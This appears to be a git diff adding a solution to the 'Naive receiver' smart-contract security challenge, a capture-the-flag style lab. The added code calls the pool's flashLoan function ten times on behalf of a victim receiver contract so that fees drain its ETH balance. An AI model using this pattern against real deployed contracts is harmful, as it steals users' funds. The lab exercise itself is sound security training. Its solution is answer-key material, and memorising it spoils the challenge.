@@ -38,6 +38,18 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        /** IERC3156FlashBorrower receiver,
+        address token,
+        uint256 amount,
+        bytes calldata data
+        **/
+        const ETH = await pool.ETH();
+        for(let i = 0; i < 10; i++) {
+            await pool.flashLoan(receiver.address, ETH, 1n, new Uint8Array([]));
+        }
+        
+        
+        console.log(await ethers.provider.getBalance(receiver.address));
     });
 
     after(async function () {
